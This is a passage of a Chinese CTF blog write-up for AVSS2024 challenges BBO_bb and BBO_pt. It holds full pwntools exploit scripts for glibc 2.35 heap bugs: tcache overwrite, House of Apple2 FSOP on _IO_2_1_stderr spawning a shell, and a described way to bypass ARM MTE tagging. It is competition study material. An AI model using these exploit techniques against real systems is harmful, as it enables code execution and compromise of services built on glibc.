+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">{</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Quickly check that the freed pointer matches the tag for the memory.</span></span><br><span class="line"><span class="comment">     This gives a useful double-free detection.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">char</span> *)mem;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> err = errno;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    {</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">	 Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        {</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        }</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">    }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Mark the chunk as belonging to the library again.  */</span></span><br><span class="line">      (<span class="type">void</span>)tag_region (chunk2mem (p), memsize (p));</span><br><span class="line"></span><br><span class="line">      ar_ptr = arena_for_chunk (p);</span><br><span class="line">      _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  __set_errno (err);</span><br><span class="line">}</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="AVSS2024-初赛"><a href="#AVSS2024-初赛" class="headerlink" title="AVSS2024 初赛"></a>AVSS2024 初赛</h2><h3 id="BBO-bb"><a href="#BBO-bb" class="headerlink" title="BBO_bb"></a>BBO_bb</h3><p>glibc2.35 堆, 没开MTE,edit时可以负偏移改写到Tcache,然后改IO_2_1_stderr进行FSOP.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">promt = <span class="string">":"</span></span><br><span class="line"></span><br><span class="line">def menu(option):</span><br><span class="line">    io.sendlineafter(promt,str(option))</span><br><span class="line"></span><br><span class="line">def add(size,content=None):</span><br><span class="line">    global promt</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(promt,str(size))</span><br><span class="line">    <span class="keyword">if</span> content != None:</span><br><span class="line">        io.sendafter(promt,content)</span><br><span class="line">def edit(idx,offset,val):</span><br><span class="line">    global promt</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(promt,str(idx))</span><br><span class="line">    io.sendlineafter(promt,str(offset))</span><br><span class="line">    io.sendlineafter(promt,str(val))</span><br><span class="line">def delete(idx):</span><br><span class="line">    global promt</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(promt,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="built_in">exp</span>():</span><br><span class="line">    add(<span class="number">0x410</span>,<span class="string">'a\n'</span>) #<span class="number">0</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">'a\n'</span>) #<span class="number">1</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">'a\n'</span>) #<span class="number">1</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">'a\n'</span>) #<span class="number">1</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">'a\n'</span>) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'\n'</span>) #<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.recvuntil(b<span class="number">'</span>\r\n\r<span class="number">'</span>) #本地不用加这个</span><br><span class="line">    p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress()<span class="number">-0x193f0a</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    IO_stderr = p.libc_base+<span class="number">0x194520</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">8</span>):</span><br><span class="line">        edit(<span class="number">0</span>,<span class="number">-0x240</span>+i,p64(p.IO_stderr)[i])</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xf0</span>,p.house_of_apple2_short(p.IO_stderr,p.system_addr,<span class="string">'  sh'</span>)+b<span class="number">'</span>\x00\n<span class="number">'</span>)</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def att_remote():</span><br><span class="line">    global io</span><br><span class="line">    io = remote(url,port)</span><br><span class="line">    p.init(io,e,libc,context)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">5</span>):</span><br><span class="line">        <span class="built_in">exp</span>()</span><br><span class="line">        io.sendafter(<span class="string">'#'</span>,<span class="string">'cat /dev/vda\n'</span>)</span><br><span class="line">        io.recvuntil(<span class="string">'/dev/vda\r\n'</span>)</span><br><span class="line">        secret = io.recv(<span class="number">32</span>)</span><br><span class="line">        io.sendafter(<span class="string">'#'</span>,<span class="string">'exit\n'</span>)</span><br><span class="line"></span><br><span class="line">        io.sendlineafter(<span class="string">'secret:'</span>,secret)</span><br><span class="line">        io.recvuntil(<span class="string">'Congratulations!'</span>)</span><br><span class="line">    p.recvflag()</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">att_remote()</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="BBO-pt"><a href="#BBO-pt" class="headerlink" title="BBO_pt"></a>BBO_pt</h3><p>和上题一样,但开启了MTE保护.由于在上一题中我们用来负偏移改Tcache的指针带上了tag,无法访问Tcache或者任何libc区域.</p>
+<p>不过由于分配小于0x80的堆块时,会直接复用堆块管理结构的剩余空间,此时用负索引即可修改到当前堆块管理结构本身.<br>很自然的想法是先覆盖当前管理结构的指针来任意写,但由于一次edit只能写入1字节,修改指针自身比较麻烦.</p>
+<p>于是可以修改size并清空指针的tag(libc管理的空间tag为0)来达到正向溢出的效果,通过比较泄露的地址可以发现堆区与libc的地址相差不大,可以正向溢出直接修改IO_list_all.<br>当然,清空tag后也就恢复了对Tcache_perthread_struct的访问能力,再按上一题的解法打即可.</p>
+<p>当我正向溢出修改IO_list_all并在堆上布置伪造的文件结构体后退出,我得到了SIGSEGV.分析过后认为是FSOP过程中访问伪造的File结构体中的指针时触发了MTE保护.<br>于是改为正向溢出修改IO_2_1_stderr,它成功了.但逐字节写入需要大量的交互过程,而解决挑战需要连续攻击成功5次,这需要相当长的时间.</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dist = p.IO_stderr-(heap_base+<span class="number">0x770</span>)</span><br><span class="line">lg(<span class="string">"distance"</span>,dist)</span><br><span class="line"></span><br><span class="line">payload = p.house_of_apple2_short(p.IO_stderr,p.system_addr,<span class="string">'  sh'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">    edit(<span class="number">1</span>,dist+i,payload[i])</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>所以改为正向溢出Tcache的next指针来劫持IO_stderr.然而结果还是SIGSEGV,分析过后认为是将IO_2_1_stderr从Tcache中malloc出来之后打上了tag,无法对其正常访问.不禁感叹MTE对于任意地址分配原语的缓解能力.</p>
+<p>不过(自认为)glibc目前打tag的方式是有缺陷的,需要tag的范围由chunk头中的size域决定,而从Tcache中取出时又没有对size域相关的检测,所以如果提前布置好size或者找一个合适的值做size(有Tcache aligin的检查之后合适的值并不好找),即可造成分配区域大小与标记范围不统一的情况,甚至是绕过标记过程.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_new_usable</span> <span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled) &amp;&amp; ptr)</span><br><span class="line">    {</span><br><span class="line">      mchunkptr cp = mem2chunk(ptr);</span><br><span class="line">      ptr = __libc_mtag_tag_region (__libc_mtag_new_tag (ptr), memsize (cp));</span><br><span class="line">    }</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>于是先任意写在_IO_2_1_stderr上方布置好一个0x20的值来绕过tag.<br>最终exp:</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">promt = <span class="string">":"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">option</span>):</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(option))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="literal">None</span>:</span><br><span class="line">        io.sendafter(promt,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,offset,val</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(offset))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(val))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> mode</span><br><span class="line">    add(<span class="number">0x410</span>,<span class="string">'a\n'</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">'HanQi\n'</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">'a\n'</span>) </span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">'a\n'</span>) </span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">'a\n'</span>) </span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">'a\n'</span>) </span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'\n'</span>) <span class="comment">#0</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    io.recv()</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b'\r\n\r'</span>) </span><br><span class="line">    p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress()-<span class="number">0x193f0a</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">b'a'</span>*<span class="number">0xf</span>+<span class="string">b'\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">        io.recvuntil(<span class="string">'a'</span>*<span class="number">0xf</span>+<span class="string">'\r\n'</span>) <span class="comment">#远程</span></span><br><span class="line">        io.recvuntil(<span class="string">'a'</span>*<span class="number">0xf</span>+<span class="string">'\r\n'</span>) <span class="comment">#远程</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.recvuntil(<span class="string">'a'</span>*<span class="number">0xf</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    heap_base = p.recvaddress()-<span class="number">0x330</span></span><br><span class="line">    lg(<span class="string">"heap_base"</span>,heap_base)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        edit(<span class="number">1</span>,-<span class="number">0x10</span>+i,p32(<span class="number">0xfffffff</span>)[i])</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>,-<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    dist = p.libc_base-(heap_base+<span class="number">0x770</span>)</span><br><span class="line">    dist += <span class="number">0x1944a8</span></span><br><span class="line">    lg(<span class="string">"distance"</span>,dist)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        edit(<span class="number">1</span>,<span class="number">0x5e0</span>+i,p64(p.mangle(heap_base+<span class="number">0xd40</span>,p.libc_base+<span class="number">0x1944b0</span>))[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        edit(<span class="number">1</span>,dist+i,p64(<span class="number">0x20</span>)[i])</span><br><span class="line"></span><br><span class="line">    payload = flat([<span class="string">b'\x00'</span>*<span class="number">0x68</span>,p.IO_stderr,p.house_of_apple2_short(p.IO_stderr,p.system_addr,<span class="string">'  sh'</span>)+<span class="string">b'\x00\n'</span>])</span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    add(<span class="number">0x400</span>,payload)</span><br><span class="line"></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">att_remote</span>():</span><br><span class="line">    <span class="keyword">global</span> io,mode</span><br><span class="line">    mode = <span class="number">1</span></span><br><span class="line">    io = remote(url,port)</span><br><span class="line">    p.init(io,e,libc,context)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        exp()</span><br><span class="line">        io.sendafter(<span class="string">'#'</span>,<span class="string">'cat /dev/vda\n'</span>)</span><br><span class="line">        io.recvuntil(<span class="string">'/dev/vda\r\n'</span>)</span><br><span class="line">        sleep(<span class="number">2</span>)</span><br><span class="line">        secret = io.recv(<span class="number">32</span>)</span><br><span class="line">        io.sendafter(<span class="string">'#'</span>,<span class="string">'exit\n'</span>)</span><br><span class="line"></span><br><span class="line">        io.sendlineafter(<span class="string">'secret:'</span>,secret)</span><br><span class="line">        io.recvuntil(<span class="string">'Congratulations!'</span>)</span><br><span class="line">    p.recvflag()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">att_remote()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>通过泄露堆指针的tag来在堆上布置FSOP也是可以完成的.</p>
+<h3 id="BBO-pa-Todo"><a href="#BBO-pa-Todo" class="headerlink" title="BBO_pa(Todo)"></a>BBO_pa(Todo)</h3><p>由于种种原因+期末,稍微拖延一下(x .</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://jamorant12138.github.io/2024/AVSS2024%20-%20MTE/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">#Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MTE/" rel="tag">MTE</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2024/CISCN2024%20-%20preliminary%20round/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">CISCN2024 初赛复现</div>
+      </a>
+    
+  </nav>
+
+  
+   
+    
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2024
+        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2022/About">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
